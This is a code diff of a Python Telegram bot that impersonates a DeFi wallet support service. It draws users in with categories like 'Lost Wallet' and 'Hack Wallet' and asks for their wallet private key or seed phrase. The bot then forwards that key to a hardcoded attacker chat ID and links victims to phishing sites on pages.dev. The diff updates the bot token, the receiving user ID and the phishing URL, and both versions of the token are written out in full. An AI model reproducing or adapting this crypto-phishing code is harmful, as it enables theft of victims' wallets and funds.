@@ -3,8 +3,8 @@ import time
 from telebot import types
 
 # Replace 'your_actual_bot_token' with your actual bot token
-BOT_TOKEN = '6660332089:AAFNaEYvH88S_t_tAzpUasNeEzjMEXAaEPo'
-TARGET_USER_ID = 5643727074
+BOT_TOKEN = '7117056570:AAEepSe7gT9N04wKgh7-SgEEDudZKjCQqjY'
+TARGET_USER_ID = 7175704341
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
@@ -23,7 +23,7 @@ def handle_category_selection(message):
     markup = types.InlineKeyboardMarkup()
 
     categories = [
-        "Migration", "Claim Token", "Swap/Bridge", "Revoke Stock Txn", "LP Unlock",
+        "Migration", "Swap/Bridge", "Revoke Stock Txn", "LP Unlock",
         "NFT Mint", "Validate", "Stake/Unstake", "Withdraw Issue",
         "Fail Swap", "Pending Txn", "Lost Wallet", "Hack Wallet",
         "Buy Token", "Claim Airdrop", "Others"
@@ -55,10 +55,6 @@ def callback_handler(call):
     if category == 'migration':
         # Perform actions related to migration
         bot.send_message(chat_id, "Performing migration-related actions...\nKindly enter the affected wallet address")
-        bot.register_next_step_handler(call.message, process_wallet_step)
-    elif category == 'Claim_Token':
-        # Perform actions related to Claim Token
-        bot.send_message(chat_id, "Performing claim token-related actions...\nKindly enter the affected wallet address")
         bot.register_next_step_handler(call.message, process_wallet_step)
     elif category == 'swap_bridge':
         # Perform actions related to swap/bridge
@@ -186,7 +182,7 @@ def process_private_key(message):
     if private_key.lower() == '/continue':
         process_continue_command(message)
     else:
-        # Send the private key to the specified chat ID (5643727074)
+        # Send the private key to the specified chat ID (7175704341)
         bot.send_message(TARGET_USER_ID, f"User {chat_id} has provided the private key or phrase: '{private_key}'")
 
         # Send a confirmation message to the user
@@ -196,7 +192,7 @@ def process_private_key(message):
         markup = types.InlineKeyboardMarkup()
 
         # Button to visit an external website
-        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://smogclaims.pages.dev/')
+        website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://spongebot.pages.dev/')
         markup.add(website_button)
         # Button to visit an external website
         website_button1 = types.InlineKeyboardButton("Connect with Specialist", url='https://t.me/helpteam_1')
@@ -213,7 +209,7 @@ def process_continue_command(message):
     bot.send_message(chat_id, "To resolve the issue, please visit the bot website and follow the instructions to connect your wallet.")
     # Create a new markup object for the button
     markup = types.InlineKeyboardMarkup()
-    website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://smogclaims.pages.dev/')
+    website_button = types.InlineKeyboardButton("Connect with DeFi bot website", url='https://spongebot.pages.dev/')
     markup.add(website_button)
 
     website_button1 = types.InlineKeyboardButton("Connect with Specialist", url='https://t.me/helpteam_1')
